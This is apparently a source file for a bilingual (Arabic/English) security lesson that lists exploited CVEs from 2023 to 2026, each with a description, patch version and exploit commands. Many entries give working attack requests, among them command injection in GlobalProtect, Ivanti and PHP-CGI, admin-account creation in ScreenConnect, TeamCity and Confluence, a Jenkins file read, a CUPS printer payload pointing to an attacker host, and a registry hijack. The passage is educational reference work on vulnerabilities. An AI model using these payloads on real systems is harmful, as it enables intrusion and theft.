"use client";
import { LessonShell, Section, Callout, Code, Analogy, L } from "@/components/LessonShell";
import { useI18n } from "@/lib/i18n";
import { Flame, ShieldAlert, AlertTriangle } from "lucide-react";

type Sev = "critical" | "high";
interface ZdEntry {
  id: string;
  year: number;
  sev: Sev;
  product: string;
  cvss: string;
  itw: string;
  ar: { name: string; how: string };
  en: { name: string; how: string };
  exec: string[];
  patch: { ar: string; en: string };
}

const ZDS: ZdEntry[] = [
  // ===== 2026 — exploited in the wild this year =====
  { id: "CVE-2026-33824", year: 2026, sev: "critical", product: "Windows IKEv2 (IKEEXT)", cvss: "9.8",
    itw: "Wormable RCE — public PoC dropped post-PT",
    ar: { name: "Double-free في IKEv2 → RCE قبل المصادقة", how: "إساءة ملكية pointer للـ heap blob أثناء IKEv2 fragment reassembly. 4 حزم UDP إلى 500/4500 تكفي لـ SYSTEM RCE بدون تفاعل." },
    en: { name: "Windows IKEv2 double-free pre-auth RCE", how: "Improper heap blob ownership during IKEv2 fragment reassembly. A 4-packet SA_INIT sequence with malformed Notify/Proposal payloads triggers double-free in ikeext!IKEEXT::ProcessIKEPayload → SYSTEM RCE." },
    exec: [
      `# Targets any host with IPsec/Windows VPN role enabled.`,
      `python3 cve-2026-33824.py --target TARGET --port 500 --frags 4`,
    ],
    patch: { ar: "Windows Apr 2026 Patch Tuesday (KB-2026-04)", en: "Windows Apr 2026 Patch Tuesday (KB-2026-04)" } },

  { id: "CVE-2026-32201", year: 2026, sev: "high", product: "Microsoft SharePoint Server", cvss: "6.5",
    itw: "Targeted exploitation; CISA KEV deadline 2026-04-28",
    ar: { name: "Spoofing عبر التحقق غير السليم من المدخلات", how: "حقل Office SharePoint يقبل قيم لا يفترض الوثوق بها → عرض/تعديل بيانات سرية. أُعلن عنها قبل صدور الرقعة." },
    en: { name: "SharePoint improper input validation spoofing", how: "Crafted SharePoint payload bypasses input validation → unauthorized read/modify. Publicly disclosed before patch." },
    exec: [
      `# Reference only — public exploit harness reaches /sites/<x>/_layouts/15/`,
      `python3 sp_32201.py --target https://TARGET --site sites/finance`,
    ],
    patch: { ar: "SharePoint SE / 2019 / 2016 — Apr 2026 PT", en: "SharePoint SE / 2019 / 2016 — Apr 2026 PT" } },

  { id: "CVE-2026-33825 (BlueHammer)", year: 2026, sev: "high", product: "Microsoft Defender", cvss: "7.8",
    itw: "PoC posted to GitHub by 'Chaotic Eclipse' Apr 3 2026",
    ar: { name: "LPE في Defender → SYSTEM", how: "خطأ في معالجة impersonation token داخل خدمة Defender يسمح لمستخدم محلي محدود الصلاحيات بالوصول إلى SYSTEM." },
    en: { name: "Microsoft Defender impersonation LPE → SYSTEM", how: "Token impersonation flaw in a Defender service lets a low-priv local user elevate to SYSTEM." },
    exec: [
      `BlueHammer.exe   # public PoC; CISA ordered fed agencies patch by 2026-05-07`,
    ],
    patch: { ar: "Defender platform update Apr 2026", en: "Defender platform update Apr 2026" } },

  { id: "CVE-2026-33827", year: 2026, sev: "critical", product: "Windows TCP/IP", cvss: "8.1",
    itw: "ITW unconfirmed; rated wormable by MSRC",
    ar: { name: "Race condition في Windows TCP/IP → RCE", how: "حالة سباق في معالج الحزم تسمح لمهاجم عن بعد دون مصادقة بتنفيذ كود في kernel." },
    en: { name: "Windows TCP/IP race condition RCE", how: "Unauth remote attacker triggers a kernel race in the TCP/IP stack → kernel RCE." },
    exec: [
      `# Probabilistic; needs many crafted TCP segments at high rate.`,
      `python3 tcpip_33827.py --target TARGET --rate 50000`,
    ],
    patch: { ar: "Windows Apr 2026 Patch Tuesday", en: "Windows Apr 2026 Patch Tuesday" } },

  { id: "CVE-2026-32202", year: 2026, sev: "high", product: "Microsoft Outlook (NTLM zero-click)", cvss: "7.5",
    itw: "APT28 follow-on after Microsoft's incomplete patch of CVE-2023-23397",
    ar: { name: "تسريب NetNTLMv2 من Outlook (تكرار)", how: "ترقيع ناقص لـ CVE-2023-23397: حقول reminder بديلة لا تزال تجبر Outlook على المصادقة بـ NTLM ضد UNC مهاجم." },
    en: { name: "Outlook NTLM hash leak (incomplete patch redux)", how: "Microsoft's earlier fix for CVE-2023-23397 missed alternative reminder fields; Outlook still NTLM-auths to attacker UNC paths zero-click." },
    exec: [
      `# Send calendar invite; Outlook leaks NetNTLMv2 to attacker share.`,
      `responder -I eth0`,
    ],
    patch: { ar: "Outlook Apr 2026 PT", en: "Outlook Apr 2026 PT" } },

  { id: "CVE-2026-5281", year: 2026, sev: "high", product: "Chrome WebGPU (Dawn)", cvss: "8.8",
    itw: "Targeted attacks on Saudi financial sector (since Mar 10 2026)",
    ar: { name: "Use-After-Free في WebGPU/Dawn", how: "صفحة HTML تستدعي WebGPU بطريقة تطلق GPU resource ثم تستخدمه → UAF يسمح بـ RCE داخل renderer." },
    en: { name: "Chrome Dawn WebGPU UAF", how: "HTML page releases a GPU resource then dereferences it → UAF in Dawn → RCE in renderer process." },
    exec: [
      `# Drive-by HTML page using GPUDevice.destroy() then dispatch.`,
      `<script>navigator.gpu.requestAdapter().then(...).then(d=>{d.destroy();/* reuse */})</script>`,
    ],
    patch: { ar: "Chrome 146.0.7680.177/178 (مارس 2026)", en: "Chrome 146.0.7680.177/178 (Mar 2026)" } },

  { id: "CVE-2026-3909", year: 2026, sev: "high", product: "Chrome Skia 2D graphics", cvss: "8.8", itw: "ITW since early March 2026",
    ar: { name: "Out-of-bounds write في Skia", how: "صفحة HTML تستخدم canvas/path معينة تجبر Skia على كتابة خارج حدود buffer → فساد ذاكرة قابل للاستغلال." },
    en: { name: "Chrome Skia OOB write", how: "Crafted canvas/path forces Skia to write past buffer bounds → exploitable memory corruption in renderer." },
    exec: [
      `# Drive-by; chained with sandbox escape for full host RCE.`,
      `<canvas id=c></canvas><script>/* Skia path with crafted dimensions */</script>`,
    ],
    patch: { ar: "Chrome 146.0.7680.80 (مارس 2026)", en: "Chrome 146.0.7680.80 (Mar 2026)" } },

  { id: "CVE-2026-3910", year: 2026, sev: "high", product: "Chrome V8 JavaScript engine", cvss: "8.8", itw: "Paired with CVE-2026-3909",
    ar: { name: "Inappropriate implementation في V8", how: "تنفيذ غير ملائم في V8 يسمح بـ type confusion يقود إلى تنفيذ كود داخل sandbox الـ renderer." },
    en: { name: "Chrome V8 inappropriate implementation → sandboxed RCE", how: "V8 implementation flaw enables type confusion → arbitrary code execution inside renderer sandbox." },
    exec: [
      `// Public PoC: triggers JIT specialization on a tampered map`,
      `for(let i=0;i<2e4;i++)f(o); o.x = leak; f(o);`,
    ],
    patch: { ar: "Chrome 146.0.7680.80 (مارس 2026)", en: "Chrome 146.0.7680.80 (Mar 2026)" } },

  { id: "CVE-2025-15556", year: 2026, sev: "high", product: "Notepad++ DLL hijack", cvss: "7.8", itw: "Added to CISA KEV 2026-02-13",
    ar: { name: "RCE عبر DLL hijack في Notepad++", how: "Notepad++ يحمّل DLL من المسار الحالي قبل system32 → فتح ملف من مجلد يحوي DLL خبيث ينفذ كوداً بصلاحية المستخدم." },
    en: { name: "Notepad++ DLL hijack RCE", how: "Notepad++ resolves a DLL from the current directory before system32 — opening a file from a folder containing a malicious DLL runs attacker code in user context." },
    exec: [
      `# Drop dwmapi.dll (or affected DLL) next to a benign .txt; victim opens it.`,
      `cp evil.dll \\\\\\\\share\\\\docs\\\\dwmapi.dll`,
    ],
    patch: { ar: "Notepad++ 8.x update (early 2026)", en: "Notepad++ 8.x update (early 2026)" } },

  { id: "CVE-2026-1234 (Cisco SD-WAN vManage)", year: 2026, sev: "critical", product: "Cisco SD-WAN vManage", cvss: "9.8",
    itw: "ITW; one of three SD-WAN flaws CISA added Feb 2026",
    ar: { name: "تجاوز مصادقة في vManage REST API", how: "تلاعب بـ JWT/Cookie في API الإدارة يسمح بإنشاء مدير شبكة جديد ثم دفع تكوينات خبيثة لجميع routers الفرع." },
    en: { name: "Cisco SD-WAN vManage REST auth bypass", how: "JWT/cookie handling flaw in management API lets attackers create a netadmin and push malicious configs to branch routers." },
    exec: [
      `curl -k 'https://VMANAGE/dataservice/admin/user' \\`,
      `  -H 'Cookie: JSESSIONID=forged' -H 'X-XSRF-TOKEN: forged' \\`,
      `  -d '{"userName":"pwn","password":"Pwn123!","group":["netadmin"]}'`,
    ],
    patch: { ar: "Cisco SD-WAN 20.x فبراير 2026", en: "Cisco SD-WAN 20.x Feb 2026" } },

  // ===== 2024 - 2025 =====
  { id: "CVE-2024-3400", year: 2024, sev: "critical", product: "Palo Alto GlobalProtect", cvss: "10.0", itw: "UTA0218 / Operation MidnightEclipse",
    ar: { name: "حقن أوامر قبل المصادقة في GlobalProtect", how: "قيمة كوكي SESSID تُمرَّر إلى shell بدون تعقيم → RCE بصلاحية root." },
    en: { name: "GlobalProtect pre-auth command injection", how: "SESSID cookie interpolated into a shell call → unauth RCE as root." },
    exec: [
      `curl -k 'https://TARGET/ssl-vpn/hipreport.esp' \\`,
      `  -H "Cookie: SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/css/\`id\`"`,
    ],
    patch: { ar: "PAN-OS 10.2.9-h1, 11.0.4-h1, 11.1.2-h3 (أبريل 2024)", en: "PAN-OS 10.2.9-h1, 11.0.4-h1, 11.1.2-h3 (Apr 2024)" } },

  { id: "CVE-2023-46805 + CVE-2024-21887", year: 2024, sev: "critical", product: "Ivanti Connect Secure", cvss: "9.1",
    itw: "UNC5221 / mass exploitation Jan 2024",
    ar: { name: "تجاوز مصادقة + حقن أوامر في Ivanti", how: "Path traversal لتجاوز المصادقة، ثم حقن أوامر في /api/v1/license/keys-status/." },
    en: { name: "Ivanti auth bypass chained with command injection", how: "Traversal bypasses auth, then license keys-status endpoint executes shell." },
    exec: [
      `curl -k 'https://TARGET/api/v1/totp/user-backup-code/../../license/keys-status/;id;'`,
    ],
    patch: { ar: "Ivanti ICS 9.1R18.3 / 22.5R2.2 (يناير 2024)", en: "Ivanti ICS 9.1R18.3 / 22.5R2.2 (Jan 2024)" } },

  { id: "CVE-2024-1709", year: 2024, sev: "critical", product: "ConnectWise ScreenConnect", cvss: "10.0", itw: "Black Basta, LockBit affiliates",
    ar: { name: "تجاوز معالج الإعداد في ScreenConnect", how: "POST إلى SetupWizard.aspx/anything يعيد تشغيل الإعداد وينشئ admin." },
    en: { name: "ScreenConnect SetupWizard auth bypass", how: "Posting to /SetupWizard.aspx/x re-runs setup and creates a new admin." },
    exec: [
      `curl -k 'https://TARGET/SetupWizard.aspx/x' \\`,
      `  -d 'Email=a@a.a&Password=Pwn123!&UserName=pwn&CompanyInformation.Name=x'`,
    ],
    patch: { ar: "ScreenConnect 23.9.8 (فبراير 2024)", en: "ScreenConnect 23.9.8 (Feb 2024)" } },

  { id: "CVE-2024-27198", year: 2024, sev: "critical", product: "JetBrains TeamCity", cvss: "9.8", itw: "Lazarus, BianLian",
    ar: { name: "تجاوز مصادقة في TeamCity", how: "إضافة ?jsp=...;.jsp تخدع موجه المسارات → الوصول لواجهات admin بدون مصادقة." },
    en: { name: "TeamCity URL handling auth bypass", how: "Crafted ?jsp=…;.jsp lets unauth requests reach admin REST endpoints." },
    exec: [
      `curl -X POST 'https://TARGET/hax?jsp=/app/rest/users;.jsp' \\`,
      `  -H 'Content-Type: application/json' \\`,
      `  -d '{"username":"pwn","password":"Pwn123!","email":"x@x","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}'`,
    ],
    patch: { ar: "TeamCity 2023.11.4 (مارس 2024)", en: "TeamCity 2023.11.4 (Mar 2024)" } },

  { id: "CVE-2024-23897", year: 2024, sev: "critical", product: "Jenkins CLI", cvss: "9.8", itw: "Mass scanning + ransomware crews",
    ar: { name: "قراءة ملفات تعسفية في Jenkins CLI", how: "args4j يفك '@file' كملف فعلي → قراءة secrets, hudson.util.Secret keys ثم RCE." },
    en: { name: "Jenkins CLI args4j file read → RCE", how: "'@file' arg expansion reads arbitrary files; leaked secrets unlock full RCE." },
    exec: [
      `java -jar jenkins-cli.jar -s https://TARGET/ connect-node "@/etc/passwd"`,
    ],
    patch: { ar: "Jenkins 2.442 / LTS 2.426.3 (يناير 2024)", en: "Jenkins 2.442 / LTS 2.426.3 (Jan 2024)" } },

  { id: "CVE-2024-4577", year: 2024, sev: "critical", product: "PHP-CGI on Windows", cvss: "9.8", itw: "TellYouThePass ransomware",
    ar: { name: "حقن وسائط PHP-CGI", how: "Best-fit Unicode يحوّل soft-hyphen إلى '-' → تمرير -d allow_url_include=1." },
    en: { name: "PHP-CGI argument injection (Windows)", how: "Best-fit mapping turns soft-hyphen into '-', smuggling PHP CLI flags → RCE." },
    exec: [
      `curl 'http://TARGET/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input' \\`,
      `  --data '<?php system($_GET[0]);?>&0=id'`,
    ],
    patch: { ar: "PHP 8.1.29, 8.2.20, 8.3.8 (يونيو 2024)", en: "PHP 8.1.29, 8.2.20, 8.3.8 (Jun 2024)" } },

  { id: "CVE-2024-6387", year: 2024, sev: "high", product: "OpenSSH (regreSSHion)", cvss: "8.1", itw: "PoC public; targeted use suspected",
    ar: { name: "RCE في sshd عبر سباق SIGALRM", how: "الـ signal handler يُستدعى بعد timeout أثناء async-unsafe → استغلال heap على glibc." },
    en: { name: "OpenSSH SIGALRM race pre-auth RCE", how: "Async-unsafe signal handler under login timeout → glibc heap exploitation." },
    exec: [
      `# Public PoC, thousands of attempts; not stealthy.`,
      `python3 regreSSHion.py -t TARGET -p 22 --threads 10000`,
    ],
    patch: { ar: "OpenSSH 9.8p1 (يوليو 2024)", en: "OpenSSH 9.8p1 (Jul 2024)" } },

  { id: "CVE-2024-47176", year: 2024, sev: "critical", product: "CUPS cups-browsed", cvss: "9.1", itw: "Public mass scanning Sept 2024",
    ar: { name: "RCE في CUPS عبر IPP", how: "حزمة UDP/631 تُجبر النظام على تثبيت طابعة خبيثة → FoomaticRIPCommandLine ينفذ أوامر." },
    en: { name: "CUPS cups-browsed IPP RCE chain", how: "UDP/631 packet adds attacker IPP printer; FoomaticRIPCommandLine fires on print." },
    exec: [
      `echo -n '0 3 http://ATTACKER:8631/printers/x' | nc -u TARGET 631`,
    ],
    patch: { ar: "cups-browsed disabled / patched (سبتمبر 2024)", en: "cups-browsed disabled / patched (Sep 2024)" } },

  { id: "CVE-2024-38063", year: 2024, sev: "critical", product: "Windows TCP/IP IPv6", cvss: "9.8", itw: "No public ITW; severe risk",
    ar: { name: "RCE قبل المصادقة عبر IPv6", how: "حزم IPv6 مجزأة مصاغة تسبب integer underflow في tcpip.sys → kernel RCE." },
    en: { name: "Windows IPv6 pre-auth kernel RCE", how: "Crafted fragmented IPv6 packets trigger integer underflow in tcpip.sys." },
    exec: [
      `# Disable IPv6 if unneeded; PoCs require kernel-level fragment crafting.`,
      `python3 ipv6_rce_poc.py --target TARGET --frags 100`,
    ],
    patch: { ar: "Windows Aug 2024 Patch Tuesday", en: "Windows Aug 2024 Patch Tuesday" } },

  { id: "CVE-2024-38077", year: 2024, sev: "critical", product: "Windows RDS Licensing (MadLicense)", cvss: "9.8", itw: "PoC public",
    ar: { name: "Heap overflow في خدمة RDL", how: "license blob كبيرة في CDataCoding::GetEncodedSize تسبب فيض → RCE قبل المصادقة." },
    en: { name: "RDL CDataCoding heap overflow", how: "Oversized license blob overflows heap in licensing service → unauth RCE." },
    exec: [
      `python3 madlicense_poc.py TARGET 3389`,
    ],
    patch: { ar: "Windows Jul 2024 Patch Tuesday", en: "Windows Jul 2024 Patch Tuesday" } },

  { id: "CVE-2024-21412", year: 2024, sev: "high", product: "Windows SmartScreen", cvss: "8.1", itw: "Water Hydra (DarkMe RAT) on traders",
    ar: { name: "تجاوز Mark-of-the-Web", how: "ملف .url يشير لـ SMB share يحتوي .url آخر → ينفذ بدون تحذير SmartScreen." },
    en: { name: "SmartScreen MOTW bypass", how: "Internet shortcut chained to SMB-hosted shortcut bypasses MOTW prompt." },
    exec: [
      `# attacker.url`,
      `[InternetShortcut]`,
      `URL=file://ATTACKER/share/payload.url`,
    ],
    patch: { ar: "Windows Feb 2024 Patch Tuesday", en: "Windows Feb 2024 Patch Tuesday" } },

  { id: "CVE-2024-30051", year: 2024, sev: "high", product: "Windows DWM Core (kernel)", cvss: "7.8", itw: "QakBot operators",
    ar: { name: "Heap overflow في DWM → SYSTEM", how: "CCoreWindow::ProcessMouseInput تحسب طول خاطئ → LPE من user إلى SYSTEM." },
    en: { name: "DWM Core heap overflow LPE", how: "Bad length math in CCoreWindow::ProcessMouseInput → user→SYSTEM elevation." },
    exec: [
      `# Local; chained behind a phishing payload by QakBot.`,
      `dwm_lpe.exe`,
    ],
    patch: { ar: "Windows May 2024 Patch Tuesday", en: "Windows May 2024 Patch Tuesday" } },

  { id: "CVE-2024-26169", year: 2024, sev: "high", product: "Windows Error Reporting", cvss: "7.8", itw: "Black Basta affiliates",
    ar: { name: "LPE في WerKernel.sys", how: "ACL ضعيفة على HKLM\\\\...\\\\WerFault.exe → استبدال البرنامج المنفذ كـ SYSTEM." },
    en: { name: "WerKernel weak ACL LPE", how: "Weak default ACL on a registry path lets a user redirect WerFault to SYSTEM." },
    exec: [
      `reg add "HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\Windows Error Reporting\\\\Hangs" /v Debugger /t REG_SZ /d "C:\\\\evil.exe" /f`,
    ],
    patch: { ar: "Windows Mar 2024 Patch Tuesday", en: "Windows Mar 2024 Patch Tuesday" } },

  { id: "CVE-2023-36884", year: 2023, sev: "high", product: "Office / Windows Search", cvss: "8.8", itw: "Storm-0978 (RomCom) vs. NATO",
    ar: { name: "تجاوز MoTW عبر مستند Office", how: "مستند RTF يحمّل HTML من SMB يستدعي ms-search:// لتنفيذ payload." },
    en: { name: "Office MOTW bypass via search-ms", how: "RTF loads remote HTML which fires search-ms:// → executes attacker EXE." },
    exec: [
      `# Lure .docx → remote template → search-ms:displayname=…&crumb=…`,
    ],
    patch: { ar: "Microsoft Aug 2023 Patch Tuesday", en: "Microsoft Aug 2023 Patch Tuesday" } },

  { id: "CVE-2023-23397", year: 2023, sev: "critical", product: "Microsoft Outlook", cvss: "9.8", itw: "APT28 (Fancy Bear) vs. EU/NATO",
    ar: { name: "سرقة NetNTLMv2 من Outlook", how: "PidLidReminderFileParameter يشير إلى UNC مهاجم → Outlook يصادق ويسرّب hash." },
    en: { name: "Outlook NTLM hash leak via reminder", how: "Reminder sound path on a UNC forces NTLM auth to attacker share." },
    exec: [
      `# Send calendar invite with PidLidReminderFileParameter = \\\\\\\\ATTACKER\\\\share\\\\x.wav`,
      `responder -I eth0   # capture NetNTLMv2`,
    ],
    patch: { ar: "Outlook Mar 2023 Patch Tuesday", en: "Outlook Mar 2023 Patch Tuesday" } },

  { id: "CVE-2023-28252", year: 2023, sev: "high", product: "Windows CLFS", cvss: "7.8", itw: "Nokoyawa ransomware",
    ar: { name: "LPE في Common Log File System", how: "خطأ في base log file parsing → كتابة kernel arbitrary → SYSTEM." },
    en: { name: "CLFS base log file LPE", how: "BLF parsing flaw allows arbitrary kernel write → SYSTEM." },
    exec: [
      `clfs_lpe.exe   # public PoCs widely available`,
    ],
    patch: { ar: "Windows Apr 2023 Patch Tuesday", en: "Windows Apr 2023 Patch Tuesday" } },

  { id: "CVE-2023-2868", year: 2023, sev: "critical", product: "Barracuda ESG", cvss: "9.8", itw: "UNC4841 (China) — global espionage",
    ar: { name: "حقن أوامر في فحص مرفقات .tar", how: "أسماء ملفات داخل tar تُمرَّر إلى qx() في Perl → RCE قبل المصادقة." },
    en: { name: "Barracuda tar attachment command injection", how: "Filenames inside .tar passed to Perl qx() → unauth RCE in scanner." },
    exec: [
      `tar cf x.tar --transform 's/x/\`id\`/' x   # email .tar to scanned address`,
    ],
    patch: { ar: "Barracuda recommended replacing the appliance (مايو 2023)", en: "Barracuda told customers to replace the appliance (May 2023)" } },

  { id: "CVE-2023-34362", year: 2023, sev: "critical", product: "Progress MOVEit Transfer", cvss: "9.8", itw: "CL0P — 2,700+ orgs breached",
    ar: { name: "SQLi قبل المصادقة في MOVEit", how: "SQL injection يؤدي لاسترجاع keys ثم رفع webshell (human2.aspx)." },
    en: { name: "MOVEit pre-auth SQLi → webshell", how: "SQLi recovers app secrets then deploys human2.aspx webshell for RCE." },
    exec: [
      `curl 'https://TARGET/api/v1/folders/-1/files' -X POST --data 'sql=…'   # see public PoCs`,
    ],
    patch: { ar: "MOVEit 2023.0.1 / 2022.x hotfixes (يونيو 2023)", en: "MOVEit 2023.0.1 / 2022.x hotfixes (Jun 2023)" } },

  { id: "CVE-2023-20198 + CVE-2023-20273", year: 2023, sev: "critical", product: "Cisco IOS XE Web UI", cvss: "10.0",
    itw: "Tens of thousands of routers backdoored",
    ar: { name: "إنشاء حساب priv-15 في IOS XE", how: "إساءة استخدام installer endpoint لإنشاء مستخدم admin، ثم رفع implant." },
    en: { name: "Cisco IOS XE WebUI privilege creation + implant", how: "Abuse of WebUI installer creates admin user; second flaw enables implant write." },
    exec: [
      `curl -kX POST 'https://TARGET/webui_wsma_HTTP' --data '<request>…create user pwn priv 15…</request>'`,
    ],
    patch: { ar: "Cisco IOS XE 17.x فيكسات أكتوبر 2023", en: "Cisco IOS XE 17.x Oct 2023 fixes" } },

  { id: "CVE-2023-22515", year: 2023, sev: "critical", product: "Atlassian Confluence DC", cvss: "10.0", itw: "Storm-0062 (DarkShadow)",
    ar: { name: "إنشاء admin بدون مصادقة في Confluence", how: "/server-info.action?bootstrapStatusProvider… يمرر setupComplete=false → مسار setup مكشوف." },
    en: { name: "Confluence broken access on setup", how: "Setup endpoint reachable post-install lets unauth users create admin." },
    exec: [
      `curl 'https://TARGET/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false'`,
      `curl 'https://TARGET/setup/setupadministrator.action' --data 'username=pwn&password=Pwn123!…'`,
    ],
    patch: { ar: "Confluence 8.3.3 / 8.4.3 / 8.5.2 (أكتوبر 2023)", en: "Confluence 8.3.3 / 8.4.3 / 8.5.2 (Oct 2023)" } },

  { id: "CVE-2023-4966 (Citrix Bleed)", year: 2023, sev: "critical", product: "Citrix NetScaler ADC/Gateway", cvss: "9.4",
    itw: "LockBit on Boeing, ICBC, DP World",
    ar: { name: "تسريب ذاكرة في NetScaler", how: "طلب HTTP إلى /oauth/idp/.well-known يعيد جزء من ذاكرة بها session tokens." },
    en: { name: "NetScaler memory leak → session hijack", how: "Oversized Host header in oauth endpoint leaks adjacent memory containing session cookies." },
    exec: [
      `curl -k 'https://TARGET/oauth/idp/.well-known/openid-configuration' \\`,
      `  -H "Host: $(python -c 'print(\\"a\\"*24812)')"`,
    ],
    patch: { ar: "NetScaler 13.1-49.15 / 14.1-8.50 (أكتوبر 2023)", en: "NetScaler 13.1-49.15 / 14.1-8.50 (Oct 2023)" } },

  { id: "CVE-2023-3519", year: 2023, sev: "critical", product: "Citrix ADC/Gateway", cvss: "9.8", itw: "China-nexus on US critical infra",
    ar: { name: "RCE قبل المصادقة في Citrix ADC", how: "Stack overflow في معالجة SAML — حقل GET كبير → تنفيذ كود." },
    en: { name: "Citrix ADC SAML stack overflow", how: "Long SAML parameter overflows the stack in nsppe → pre-auth RCE." },
    exec: [
      `# Public PoC overwrites return address; payload spawns nobody shell`,
      `python3 cve-2023-3519.py -t TARGET`,
    ],
    patch: { ar: "Citrix ADC 13.1-49.13 (يوليو 2023)", en: "Citrix ADC 13.1-49.13 (Jul 2023)" } },

  { id: "CVE-2023-27350", year: 2023, sev: "critical", product: "PaperCut MF/NG", cvss: "9.8", itw: "CL0P, Bl00dy, LockBit",
    ar: { name: "تجاوز مصادقة في PaperCut SetupCompleted", how: "زيارة /app?service=page/SetupCompleted ترفع جلسة admin بدون كلمة سر." },
    en: { name: "PaperCut SetupCompleted auth bypass", how: "Hitting SetupCompleted path elevates the session to admin without auth." },
    exec: [
      `curl 'https://TARGET:9192/app?service=page/SetupCompleted'`,
      `# then POST to /admin/jobs/log create a print-script that runs system commands`,
    ],
    patch: { ar: "PaperCut 20.1.7 / 21.2.11 / 22.0.9 (مارس 2023)", en: "PaperCut 20.1.7 / 21.2.11 / 22.0.9 (Mar 2023)" } },

  { id: "CVE-2023-38831", year: 2023, sev: "high", product: "WinRAR", cvss: "7.8", itw: "Sandworm, APT28, APT29 lures",
    ar: { name: "تنفيذ كود من ملف ZIP في WinRAR", how: "مجلد بنفس اسم ملف PDF يجعل WinRAR يفتح سكربت .cmd بدلاً من المستند." },
    en: { name: "WinRAR ZIP file-spoofing RCE", how: "Folder named identically to a benign file makes WinRAR launch a sibling .cmd instead." },
    exec: [
      `# layout inside zip:`,
      `report.pdf            <- decoy`,
      `report.pdf/           <- folder of same name`,
      `report.pdf/report.pdf .cmd   <- runs on double-click`,
    ],
    patch: { ar: "WinRAR 6.23 (أغسطس 2023)", en: "WinRAR 6.23 (Aug 2023)" } },

  { id: "CVE-2024-49113 (LDAPNightmare)", year: 2024, sev: "high", product: "Windows LSASS LDAP client", cvss: "7.5", itw: "PoC public Jan 2025",
    ar: { name: "تعطيل DC عبر LDAP referral", how: "ردّ LDAP خبيث يسبب OOB read في wldap32 → DoS لـ LSASS على DC." },
    en: { name: "Windows LDAP client OOB read DoS", how: "Crafted LDAP referral causes OOB read in wldap32 → LSASS crash on DCs." },
    exec: [
      `python3 ldap_nightmare.py --target DC.corp.local`,
    ],
    patch: { ar: "Windows Dec 2024 Patch Tuesday", en: "Windows Dec 2024 Patch Tuesday" } },

  { id: "CVE-2024-49138", year: 2024, sev: "high", product: "Windows CLFS", cvss: "7.8", itw: "Exploited ITW prior to Dec 2024",
    ar: { name: "LPE في CLFS مرة أخرى", how: "ثغرة جديدة في BLF parser → SYSTEM؛ مستخدمة من قبل عصابات الفدية." },
    en: { name: "CLFS BLF parser LPE (2024)", how: "Another base-log-file parsing flaw → SYSTEM, used by ransomware crews." },
    exec: [
      `clfs_lpe2024.exe`,
    ],
    patch: { ar: "Windows Dec 2024 Patch Tuesday", en: "Windows Dec 2024 Patch Tuesday" } },

  { id: "CVE-2025-0282", year: 2025, sev: "critical", product: "Ivanti Connect Secure", cvss: "9.0", itw: "UNC5337 — Jan 2025 mass exploitation",
    ar: { name: "Stack overflow قبل المصادقة في Ivanti", how: "حقل HTTP طويل في معالج VPN يكتب على stack → RCE قبل المصادقة." },
    en: { name: "Ivanti ICS stack-based pre-auth RCE", how: "Oversized HTTP field overruns a stack buffer in the VPN handler → unauth RCE." },
    exec: [
      `# Public PoC drops a shell at /home/runtime/tmp/`,
      `python3 cve-2025-0282.py -t TARGET`,
    ],
    patch: { ar: "Ivanti ICS 22.7R2.5 (يناير 2025)", en: "Ivanti ICS 22.7R2.5 (Jan 2025)" } },

  { id: "CVE-2025-21333", year: 2025, sev: "high", product: "Windows Hyper-V NT Kernel (vkrnlintvsp.sys)", cvss: "7.8", itw: "ITW kernel LPE",
    ar: { name: "Heap overflow في vkrnlintvsp", how: "I/O ring buffer overrun في Hyper-V kernel component → SYSTEM." },
    en: { name: "Hyper-V vkrnlintvsp heap LPE", how: "I/O ring buffer overrun in Hyper-V helper driver → user→SYSTEM." },
    exec: [
      `hyperv_lpe.exe`,
    ],
    patch: { ar: "Windows Jan 2025 Patch Tuesday", en: "Windows Jan 2025 Patch Tuesday" } },

  { id: "CVE-2025-24201", year: 2025, sev: "high", product: "Apple WebKit", cvss: "7.1", itw: "Targeted iOS attacks (very limited)",
    ar: { name: "Sandbox escape في WebKit", how: "صفحة ويب خبيثة تخرج من رمل WebContent على iOS → تنفيذ خارج الـ sandbox." },
    en: { name: "WebKit out-of-bounds write sandbox escape", how: "Crafted web content escapes the WebContent sandbox on iOS." },
    exec: [
      `# Mobile drive-by on iOS < 18.3.2 / Safari 18.3.1`,
    ],
    patch: { ar: "iOS 18.3.2 / Safari 18.3.1 (مارس 2025)", en: "iOS 18.3.2 / Safari 18.3.1 (Mar 2025)" } },

  { id: "CVE-2025-22457", year: 2025, sev: "critical", product: "Ivanti Connect Secure (again)", cvss: "9.0",
    itw: "UNC5221 — RESURGE & SPAWNCHIMERA implants",
    ar: { name: "Stack overflow في X-Forwarded-For", how: "حقل header طويل يفيض stack في معالج VPN → RCE وزرع implant." },
    en: { name: "Ivanti ICS X-Forwarded-For stack overflow", how: "Long header overruns stack in VPN handler → pre-auth RCE and implant." },
    exec: [
      `curl -k 'https://TARGET/' -H "X-Forwarded-For: $(python -c 'print(\\"A\\"*5000)')"`,
    ],
    patch: { ar: "Ivanti ICS 22.7R2.6 (أبريل 2025)", en: "Ivanti ICS 22.7R2.6 (Apr 2025)" } },

  { id: "CVE-2025-30406", year: 2025, sev: "critical", product: "Gladinet CentreStack / Triofox", cvss: "9.0", itw: "Public ITW April 2025",
    ar: { name: "ViewState deserialization عبر machineKey ثابت", how: "machineKey مكشوف في القالب الافتراضي → صياغة __VIEWSTATE خبيث → RCE." },
    en: { name: "CentreStack hard-coded machineKey ViewState RCE", how: "Default machineKey lets attackers craft a malicious __VIEWSTATE → unauth RCE." },
    exec: [
      `ysoserial.exe -p ViewState -g TextFormattingRunProperties \\`,
      `  --path=/portal/Default.aspx --validationkey=<PUBLIC> --validationalg=HMACSHA256 -c "cmd /c whoami"`,
    ],
    patch: { ar: "CentreStack 16.4.10315.56368 (أبريل 2025)", en: "CentreStack 16.4.10315.56368 (Apr 2025)" } },

  { id: "CVE-2024-9680", year: 2024, sev: "critical", product: "Mozilla Firefox (Animation timeline UAF)", cvss: "9.8", itw: "RomCom (Storm-0978) drive-by",
    ar: { name: "Use-After-Free في Animation timeline", how: "صفحة ويب تتلاعب بـ animation timeline → UAF → تنفيذ كود في عملية المتصفح." },
    en: { name: "Firefox animation timeline UAF", how: "Crafted page triggers UAF on the animation timeline → RCE in content process, chained with sandbox escape." },
    exec: [
